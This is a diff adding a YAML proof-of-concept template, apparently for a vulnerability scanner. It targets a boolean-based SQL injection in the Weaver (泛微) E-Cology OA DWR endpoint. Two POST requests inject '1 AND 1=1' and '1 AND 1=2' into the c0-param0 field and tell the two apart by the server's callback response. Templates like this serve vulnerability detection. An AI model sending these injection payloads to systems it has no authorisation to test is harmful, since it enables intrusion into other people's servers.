@@ -1,0 +1,58 @@
+id: poc-yaml-fanwei-oa-ecology-c0-param0-sql-injection
+info:
+  name: 泛微OA-ECology-c0-param0-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 泛微E-Cology
+requests:
+- method: POST
+  path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+  data: 'callCount=1
+
+    page=
+
+    httpSessionId=
+
+    scriptSessionId=
+
+    c0-scriptName=DocDwrUtil
+
+    c0-methodName=ifNewsCheckOutByCurrentUser
+
+    c0-id=0
+
+    c0-param0=string:1 AND 1=1
+
+    c0-param1=string:1
+
+    batchId=0
+
+    '
+  expression: status_code == 200  && contains(body, "dwr.engine._remoteHandleCallback('0','0',true)")
+- method: POST
+  path: /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr
+  data: 'callCount=1
+
+    page=
+
+    httpSessionId=
+
+    scriptSessionId=
+
+    c0-scriptName=DocDwrUtil
+
+    c0-methodName=ifNewsCheckOutByCurrentUser
+
+    c0-id=0
+
+    c0-param0=string:1 AND 1=2
+
+    c0-param1=string:1
+
+    batchId=0
+
+    '
+  expression: status_code == 200  && contains(body, "dwr.engine._remoteHandleCallback('0','0',false)")
+variables: {}
+transport: http
